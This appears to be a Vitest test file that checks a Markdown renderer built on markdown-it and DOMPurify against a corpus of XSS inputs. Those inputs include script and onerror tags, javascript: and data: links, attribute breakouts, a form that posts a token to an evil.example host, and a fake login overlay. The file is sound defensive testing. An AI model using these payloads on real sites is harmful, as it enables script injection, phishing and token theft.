// @vitest-environment jsdom
import DOMPurify from 'dompurify';
import { describe, expect, it } from 'vitest';
import { renderMarkdown } from '../../src/webview/markdown';

/** Parses HTML into an inert fragment: nothing in it loads or runs. */
function parse(html: string): DocumentFragment {
  const template = document.createElement('template');
  template.innerHTML = html;
  return template.content;
}

function render(markdown: string): DocumentFragment {
  return parse(renderMarkdown(markdown));
}

/**
 * `renderMarkdown` has two layers: markdown-it with raw HTML off, then
 * DOMPurify. DOMPurify needs a standards-compliant DOM, and its README says
 * happy-dom is not one: there it cleans the first node and leaves the rest
 * untouched. This file therefore runs on jsdom. The probe stays as a guard:
 * if the environment ever changes to one where DOMPurify cannot work, the
 * tests that only it can satisfy are skipped instead of passing by accident.
 */
const sanitizerWorks = ((): boolean => {
  const cleaned = parse(
    DOMPurify.sanitize('<p>first</p><p><b style="color:red" onclick="alert(1)">second</b><img src="x" onerror="alert(1)"></p>'),
  );
  // DOMPurify's defaults keep `style`, so only the event handlers are checked here.
  return (
    cleaned.querySelectorAll('p').length === 2 &&
    cleaned.querySelector('img[onerror]') === null &&
    cleaned.querySelector('[onclick]') === null
  );
})();
const itWithSanitizer = it.skipIf(!sanitizerWorks);

const ACTIVE_ELEMENTS = [
  'script',
  'img',
  'picture',
  'iframe',
  'frame',
  'object',
  'embed',
  'style',
  'link',
  'meta',
  'base',
  'form',
  'input',
  'button',
  'textarea',
  'select',
  'svg',
  'math',
  'video',
  'audio',
  'source',
  'track',
  'template',
  'noscript',
].join(',');
const URL_ATTRIBUTES = ['href', 'src', 'action', 'formaction', 'xlink:href', 'poster', 'data', 'background'];

function scheme(url: string): string | undefined {
  // Browsers ignore whitespace and control characters inside a scheme.
  // eslint-disable-next-line no-control-regex
  return /^([a-z][a-z0-9+.-]*):/i.exec(url.replace(/[\u0000- ]/g, ''))?.[1]?.toLowerCase();
}

/** The properties that make rendered transcript text safe to put in the page. */
function expectInert(dom: DocumentFragment): void {
  expect([...dom.querySelectorAll(ACTIVE_ELEMENTS)].map((element) => element.tagName.toLowerCase())).toEqual([]);
  for (const element of dom.querySelectorAll('*')) {
    for (const name of element.getAttributeNames()) {
      const attribute = `<${element.tagName.toLowerCase()} ${name}>`;
      expect(name.toLowerCase().startsWith('on'), `event handler ${attribute}`).toBe(false);
      expect(['style', 'srcset', 'srcdoc'], `forbidden ${attribute}`).not.toContain(name.toLowerCase());
      if (URL_ATTRIBUTES.includes(name.toLowerCase())) {
        const found = scheme(element.getAttribute(name) ?? '');
        expect([undefined, 'http', 'https', 'mailto'], `URL scheme of ${attribute}`).toContain(found);
      }
    }
  }
}

describe('renderMarkdown XSS corpus', () => {
  it('shows a raw script tag as text', () => {
    const dom = render('Before\n\n<script>alert(document.cookie)</script>\n\nAfter');
    expectInert(dom);
    expect(dom.querySelector('script')).toBeNull();
    expect(dom.textContent).toContain('<script>alert(document.cookie)</script>');
  });

  it('shows an inline script tag as text', () => {
    const dom = render('Some text <script src="https://evil.example/x.js"></script> and more.');
    expectInert(dom);
    expect(dom.textContent).toContain('<script src="https://evil.example/x.js"></script>');
  });

  it('shows a raw img tag with an error handler as text', () => {
    const dom = render('Look: <img src=x onerror=alert(1)>');
    expectInert(dom);
    expect(dom.querySelector('img')).toBeNull();
    expect(dom.textContent).toContain('<img src=x onerror=alert(1)>');
  });

  it.each([
    ['a plain javascript: link', '[click me](javascript:alert(1))'],
    ['a mixed-case scheme', '[click me](JaVaScRiPt:alert(1))'],
    ['an entity-encoded scheme', '[click me](&#106;avascript:alert(1))'],
    ['a named-entity colon', '[click me](javascript&colon;alert(1))'],
    ['an angle-bracket destination', '[click me](<javascript:alert(1)>)'],
    ['an autolink', '<javascript:alert(1)>'],
    ['a reference definition', '[click me][ref]\n\n[ref]: javascript:alert(1)'],
    ['a vbscript: link', '[click me](vbscript:msgbox(1))'],
    ['a file: link', '[click me](file:///etc/passwd)'],
  ])('does not make %s clickable', (_label, markdown) => {
    const dom = render(markdown);
    expectInert(dom);
    for (const anchor of dom.querySelectorAll('a')) {
      expect(scheme(anchor.getAttribute('href') ?? '')).not.toBe('javascript');
    }
  });

  it.each([
    ['an HTML document', '[click me](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)'],
    ['an inline HTML document', '[click me](data:text/html,<script>alert(1)</script>)'],
    ['an SVG image', '[click me](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIi8+)'],
    ['an autolink', '<data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>'],
  ])('does not make a data: link to %s clickable', (_label, markdown) => {
    const dom = render(markdown);
    expectInert(dom);
    expect(dom.querySelector('a[href^="data:" i]')).toBeNull();
  });

  itWithSanitizer('does not make a data: link to a bitmap clickable either', () => {
    // markdown-it lets data:image/png through; removing it is DOMPurify's job.
    const dom = render('A [picture](data:image/png;base64,iVBORw0KGgo=) and ![another](data:image/png;base64,iVBORw0KGgo=).');
    expectInert(dom);
    expect(dom.querySelector('a[href^="data:" i]')).toBeNull();
    expect(dom.textContent).toContain('picture');
  });

  it('turns a remote Markdown image into a link instead of loading it', () => {
    const dom = render('Status: ![build badge](https://tracker.example.com/pixel.png?id=42)');
    expectInert(dom);
    expect(dom.querySelector('img')).toBeNull();
    const anchors = [...dom.querySelectorAll('a')];
    expect(anchors.map((anchor) => anchor.getAttribute('href'))).toEqual(['https://tracker.example.com/pixel.png?id=42']);
    expect(anchors[0]?.textContent).toBe('build badge');
  });

  it.each([
    ['an image with a title', '![chart](https://tracker.example.com/a.png "A title")'],
    ['an image with no alt text', '![](https://tracker.example.com/a.png)'],
    ['a reference-style image', '![chart][ref]\n\n[ref]: https://tracker.example.com/a.png'],
    ['an image inside a link', '[![chart](https://tracker.example.com/a.png)](https://example.com/report)'],
    ['an image in a heading', '# ![chart](https://tracker.example.com/a.png)'],
    ['an image in a table', '| a |\n|---|\n| ![chart](https://tracker.example.com/a.png) |'],
    ['a protocol-relative image', '![chart](//tracker.example.com/a.png)'],
  ])('produces no img element for %s', (_label, markdown) => {
    const dom = render(markdown);
    expectInert(dom);
    expect(dom.querySelector('img')).toBeNull();
  });

  it.each([
    ['in the alt text', '![x" onerror="alert(1)](https://example.com/a.png)'],
    ['in the alt text, as a tag', '![<img src=x onerror=alert(1)>](https://example.com/a.png)'],
    ['in the URL', '![x](https://example.com/a.png"onerror="alert(1))'],
    ['in the URL, with a closing tag', '![x](https://example.com/a.png"><script>alert(1)</script>)'],
    ['in the title', '![x](https://example.com/a.png "t\\" onmouseover=\\"alert(1)")'],
  ])('does not let an image break out of its attribute %s', (_label, markdown) => {
    const dom = render(markdown);
    expectInert(dom);
    expect(dom.querySelector('img')).toBeNull();
  });

  it.each([
    ['in the link text', '[<b onmouseover=alert(1)>hover</b>](https://example.com)'],
    ['in the URL', '[x](https://example.com/"onmouseover="alert(1))'],
    ['in the title', '[x](https://example.com "t\\" onmouseover=\\"alert(1)")'],
    ['in an autolink', '<https://example.com/"onmouseover="alert(1)>'],
  ])('does not let a link break out of its attribute %s', (_label, markdown) => {
    expectInert(render(markdown));
  });

  it.each([
    ['a bold tag', '<b style="position:fixed;inset:0;background:#fff">Session expired. Log in again.</b>'],
    ['a div', '<div style="background:url(https://tracker.example.com/beacon)">x</div>'],
    ['a span inside Markdown', 'Hello **world** <span style="font-size:200px">big</span>'],
  ])('shows inline style on %s as text, not as styling', (_label, markdown) => {
    const dom = render(markdown);
    expectInert(dom);
    expect(dom.querySelector('[style]')).toBeNull();
    expect(dom.textContent).toContain('style=');
  });

  it('shows a style element as text', () => {
    const dom = render('<style>body { display: none }</style>\n\ntext');
    expectInert(dom);
    expect(dom.querySelector('style')).toBeNull();
  });

  it('shows an iframe as text', () => {
    const dom = render('<iframe src="https://evil.example/login" width="100%" height="900"></iframe>');
    expectInert(dom);
    expect(dom.querySelector('iframe')).toBeNull();
    expect(dom.textContent).toContain('<iframe');
  });

  it('shows an iframe with a srcdoc as text', () => {
    const dom = render('text <iframe srcdoc="<script>parent.alert(1)</script>"></iframe> text');
    expectInert(dom);
    expect(dom.querySelector('iframe')).toBeNull();
  });

  it.each([
    ['an svg with an onload handler', '<svg onload=alert(1)></svg>'],
    ['an svg that holds a script', '<svg><script>alert(1)</script></svg>'],
    ['a math element', '<math><mi xlink:href="javascript:alert(1)">x</mi></math>'],
    ['a raw anchor with a javascript: URL', '<a href="javascript:alert(1)">click</a>'],
    ['a form', '<form action="https://evil.example/steal"><input name="token"><button>Send</button></form>'],
    ['a stylesheet link', '<link rel="stylesheet" href="https://evil.example/x.css">'],
    ['a meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.example">'],
    ['a base element', '<base href="https://evil.example/">'],
    ['an object', '<object data="https://evil.example/x.swf"></object>'],
    ['an embed', '<embed src="https://evil.example/x.swf">'],
    ['a video with a failing source', '<video><source onerror="alert(1)"></video>'],
    ['an audio element', '<audio src=x onerror=alert(1)></audio>'],
    ['a details element with a toggle handler', '<details open ontoggle=alert(1)>x</details>'],
    ['a body tag with an onload handler', '<body onload=alert(1)>'],
    ['an unclosed tag', '<img src=x onerror=alert(1)//'],
    ['an HTML comment that hides a tag', '<!--><script>alert(1)</script>-->'],
    ['a CDATA section', '<![CDATA[<script>alert(1)</script>]]>'],
    ['a processing instruction', '<?xml version="1.0"?><script>alert(1)</script>'],
    ['an HTML block inside a list', '- item\n\n  <script>alert(1)</script>'],
    ['an HTML block inside a blockquote', '> <img src=x onerror=alert(1)>'],
    ['a tag inside emphasis', '**<img src=x onerror=alert(1)>**'],
    ['a tag inside a heading', '# <script>alert(1)</script>'],
    ['a tag inside a table cell', '| a |\n|---|\n| <img src=x onerror=alert(1)> |'],
    ['a tag inside link text', '[<img src=x onerror=alert(1)>](https://example.com)'],
    ['an entity-encoded tag', '&lt;script&gt;alert(1)&lt;/script&gt;'],
    ['a numeric-entity tag', '&#60;script&#62;alert(1)&#60;/script&#62;'],
  ])('renders %s as inert content', (_label, markdown) => {
    expectInert(render(markdown));
  });

  it('keeps markup inside code as text', () => {
    const dom = render('Inline `<script>alert(1)</script>` and a block:\n\n```html\n<img src=x onerror=alert(1)>\n<iframe src="https://evil.example"></iframe>\n```');
    expectInert(dom);
    const code = [...dom.querySelectorAll('code')].map((element) => element.textContent);
    expect(code[0]).toBe('<script>alert(1)</script>');
    expect(code[1]).toContain('<img src=x onerror=alert(1)>');
    expect(code[1]).toContain('<iframe src="https://evil.example"></iframe>');
  });

  it('does not let a code fence info string add attributes', () => {
    const dom = render('```js" onmouseover="alert(1)\nconst x = 1;\n```');
    expectInert(dom);
    expect(dom.querySelector('code')?.textContent).toContain('const x = 1;');
  });

  it('stays inert for a large hostile document', () => {
    const payloads = [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '[x](javascript:alert(1))',
      '![x](https://tracker.example.com/a.png)',
      '<iframe src="https://evil.example"></iframe>',
      '<b style="color:red">x</b>',
    ];
    const markdown = Array.from({ length: 300 }, (_, n) => `Entry ${n}: ${payloads[n % payloads.length]}`).join('\n\n');
    const dom = render(markdown);
    expectInert(dom);
    expect(dom.textContent).toContain('Entry 0:');
    expect(dom.textContent).toContain('Entry 299:');
  });
});

describe('renderMarkdown output that needs the DOMPurify pass', () => {
  itWithSanitizer('removes the inline style that Markdown table alignment produces', () => {
    const dom = render('| left | right |\n|:-----|------:|\n| a | b |');
    expect(dom.querySelector('table')).not.toBeNull();
    expect(dom.querySelector('[style]')).toBeNull();
  });

  itWithSanitizer('removes class and id attributes, so rendered text cannot pick up page styles', () => {
    const dom = render('```js\nconst x = 1;\n```');
    expect(dom.querySelector('code')?.textContent).toContain('const x = 1;');
    expect(dom.querySelector('[class], [id]')).toBeNull();
  });

  itWithSanitizer('keeps the block structure of ordinary Markdown', () => {
    const dom = render('# Title\n\nA paragraph with **bold** and *emphasis*.\n\n- one\n- two\n\n> quoted\n\n```ts\nconst x = 1;\n```');
    expect(dom.querySelector('h1')?.textContent).toBe('Title');
    expect(dom.querySelector('strong')?.textContent).toBe('bold');
    expect(dom.querySelector('em')?.textContent).toBe('emphasis');
    expect([...dom.querySelectorAll('li')].map((item) => item.textContent?.trim())).toEqual(['one', 'two']);
    expect(dom.querySelector('blockquote')?.textContent?.trim()).toBe('quoted');
    expect(dom.querySelector('pre code')?.textContent).toBe('const x = 1;\n');
  });
});

describe('renderMarkdown ordinary content', () => {
  it('renders an https link as an anchor with that href', () => {
    const dom = render('See the [documentation](https://example.com/docs?page=2#install) for details.');
    const anchors = [...dom.querySelectorAll('a')];
    expect(anchors).toHaveLength(1);
    expect(anchors[0]?.getAttribute('href')).toBe('https://example.com/docs?page=2#install');
    expect(anchors[0]?.textContent).toBe('documentation');
  });

  it('turns a bare URL into a link', () => {
    const dom = render('Read https://example.com/changelog before upgrading.');
    expect(dom.querySelector('a')?.getAttribute('href')).toBe('https://example.com/changelog');
  });

  it('keeps a mailto link', () => {
    const dom = render('Write to [support](mailto:support@example.com).');
    expect(dom.querySelector('a')?.getAttribute('href')).toBe('mailto:support@example.com');
  });

  it('renders inline formatting and code', () => {
    const dom = render('Run `npm test`, then check the **summary** line.');
    expect(dom.querySelector('code')?.textContent).toBe('npm test');
    expect(dom.querySelector('strong')?.textContent).toBe('summary');
  });

  it('keeps the text of every part of a document', () => {
    const dom = render('# Title\n\nFirst paragraph.\n\n- item one\n- item two\n\n```sh\ngit status\n```\n\nLast paragraph.');
    for (const text of ['Title', 'First paragraph.', 'item one', 'item two', 'git status', 'Last paragraph.']) {
      expect(dom.textContent).toContain(text);
    }
  });

  it('returns an empty string for empty text', () => {
    expect(renderMarkdown('')).toBe('');
    expect(render('   \n\n').textContent?.trim()).toBe('');
  });

  it('returns a string', () => {
    expect(typeof renderMarkdown('plain text')).toBe('string');
  });
});
